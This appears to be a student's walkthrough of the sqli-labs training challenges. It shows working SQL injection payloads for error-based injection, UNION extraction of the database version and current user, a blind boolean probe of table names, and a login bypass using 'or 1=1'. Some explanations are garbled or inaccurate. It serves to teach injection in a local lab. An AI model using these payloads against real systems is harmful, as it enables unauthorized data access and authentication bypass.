# Web Exploitation

## SQLI Lab Challenges

### Challenge 1 --> GET Error Based Single Quotes String

![Minion](https://github.com/abhishekabi2002/Bi0s/blob/master/Web%20Exploitation/Assets/1.jpeg?raw=true)

- Input the Id as Parameter with numerical value.
- Use **\?variable name = value** after the URL.
- Here the variable name is **ID**.
- The value is any numerical value. **Eg : 1**
- Main Query is **Select * from TABLE where id='given_value';**
- With our input as 1 complete backend query will be 
```
SELECT * from table_name WHERE id=’1’ LIMIT 0,1
```

- With our input as 1’ complete backend query will be 
 ```
SELECT * from table_name WHERE id=’1’’ LIMIT 0,1
```
- which is syntactically incorrect and by giving input as, 

```
1’–+ (1 quote hyphen hyphen plus)
1’–%20 (%20 URL encoding for space)
1’%23 (%23 URL encoding for #)

--> %20 for. spaces  
--> %23 for. #
```

![Minion](https://github.com/abhishekabi2002/Bi0s/blob/master/Web%20Exploitation/Assets/2.jpeg?raw=true)

### Challenge 2 --> GET Error Based Integer Based

![Minion](https://github.com/abhishekabi2002/Bi0s/blob/master/Web%20Exploitation/Assets/3.jpeg?raw=true)

- Now we try to attack by putting in strings such as “abc“and “xyz” 
- We observe that for lesson 2 we receive an error from the database. 
- If we put id = 1' we again get an error in the Mysql server for incorrect syntax.  **You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘\’ LIMIT 0,1′ at line 1**
- Now the query which it changes to is

```
Select * from TABLE where id = 1’ ;
```
So we have an odd number of single quotes (‘), which breaks the query and takes it as an integer.

```
Select * from TABLE where id = (some integer value); ;
```

- To avoid such errors we can comment out the rest of the query.

**We inject the code with ?id=1′%20 --** 

( OR )

**We inject the code with ?id=1′%23 #** 

```
Select * from TABLE where id = 1’%20 -- ;

( OR )

Select * from TABLE where id = 1’%23 # ;
```

![Minion](https://github.com/abhishekabi2002/Bi0s/blob/master/Web%20Exploitation/Assets/4.jpeg?raw=true)

### Challenge 3 --> Error Based Single Quotes with twist String

![Minion](https://github.com/abhishekabi2002/Bi0s/blob/master/Web%20Exploitation/Assets/5.jpeg?raw=true)

- If we put some strings and number to check how the query is working we will get an error message **Server version for the right syntax to use near ””) LIMIT 0,1′ at line 1**

```
--> So the Query at Back End is,

Select login_name, select password from table where id= (‘our input here’)
```

**So if we inject the code with ?id=1′) –+****  

- To avoid such errors we can comment out the rest of the query.

```
Select * from TABLE where id = ('1’) -- ;
```

![Minion](https://github.com/abhishekabi2002/Bi0s/blob/master/Web%20Exploitation/Assets/6.jpeg?raw=true)

### Challenge 4 --> Error Based Double Quotes String

![Minion](https://github.com/abhishekabi2002/Bi0s/blob/master/Web%20Exploitation/Assets/7.jpeg?raw=true)

- If we put some strings and number to check how the query is working we will get an error message **Server version for the right syntax to user near '"1"") LIMIT 0,1' at line 1**

```
--> So the Query at Back End is,

Select login_name, password from table where id= ("our input here ")
```

**So if we inject the code with ?id=1") --+******  

- To avoid such errors we can comment out the rest of the query.

```
Select * from TABLE where id = ("1") -- ;
```

![Minion](https://github.com/abhishekabi2002/Bi0s/blob/master/Web%20Exploitation/Assets/8.jpeg?raw=true)

### Challenge 5 --> Fixing the Query without using Comments

![Minion](https://github.com/abhishekabi2002/Bi0s/blob/master/Web%20Exploitation/Assets/9.jpeg?raw=true)

- If we use the union select command to get more sensitive information from the database.  

```
--> In this query we use the version() function for detecting the database version; 

-6′ union select 5, version(),3 AND ‘1

--> Displays user Information
-6′ union select 5,current_user,3 AND ‘1
```



### Challenge 8 --> Blind Boolean Based Single Quotes

![Minion](https://github.com/abhishekabi2002/Bi0s/blob/master/Web%20Exploitation/Assets/12.jpeg?raw=true)

```
--> We know 1 is not equal to 1 hence database answer as ‘TRUE’ query.

SELECT * from table_name WHERE id=1' AND 1=1

--> We know 1 is not equal to 0 hence database answer as ‘FALSE’ query.

SELECT * from table_name WHERE id=1' AND 1=0

--> Test the condition whether the length of string for the first table is greater than 5 or not.

http://localhost/sqli-labs/Less-8/?id=1)' AND (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))) > 5 --+
```


### Challenge 11 & 12 --> Post Error-based single & double quotes

![Minion](https://github.com/abhishekabi2002/Bi0s/blob/master/Web%20Exploitation/Assets/15.jpeg?raw=true)

![Minion](https://github.com/abhishekabi2002/Bi0s/blob/master/Web%20Exploitation/Assets/16.jpeg?raw=true)

- By trying various SQL Injections we come to know that the Query being used in Back End is ,

```
Select * from TABLE where username= (“$uname”) and password=(“$password”) LIMIT 0,1
```
- If we comment the rest after **Username** then we will be able to get **Login**.
```
Username = “) or 1=1 #

( OR )

Username = “) or 1=1 LIMIT 2,1 #
```

#### References --> https://github.com/Audi-1/sqli-labs
